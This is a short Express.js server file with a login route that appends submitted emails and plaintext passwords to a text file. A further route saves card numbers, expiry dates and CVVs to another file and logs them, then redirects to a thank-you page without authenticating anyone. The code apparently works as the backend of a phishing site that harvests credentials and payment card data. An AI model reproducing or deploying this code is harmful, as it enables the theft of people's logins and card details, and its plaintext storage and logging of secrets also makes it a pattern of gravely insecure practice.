const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3001;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like your HTML files)
app.use(express.static(path.join(__dirname, 'public')));

// Handle login form submission
app.post('/login', (req, res) => {
    const email = req.body.email;
    const password = req.body.password;

    const userData = `Email: ${email}, Password: ${password}\n`;

    // Append user data to a file
    fs.appendFile('users.txt', userData, (err) => {
        if (err) {
            console.error('Failed to write to file:', err);
            return res.status(500).send('Internal Server Error');
        }
        console.log('User data saved:', userData);
        res.redirect('/thankyou.html'); // Redirect to a thank you page or a different page
    });
});

// Handle sign up request
app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'card-details.html'));
});

// Handle card details form submission
app.post('/submit-payment', (req, res) => {
    const cardNumber = req.body['card-number'];
    const expiryDate = req.body['expiry-date'];
    const cvv = req.body['cvv'];

    const cardData = `Card Number: ${cardNumber}, Expiry Date: ${expiryDate}, CVV: ${cvv}\n`;

    // Append card details to a file
    fs.appendFile('payment_details.txt', cardData, (err) => {
        if (err) {
            console.error('Failed to write to file:', err);
            return res.status(500).send('Internal Server Error');
        }
        console.log('Card details saved:', cardData);
        res.redirect('/thankyou.html'); // Redirect to a thank you page or a different page
    });
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
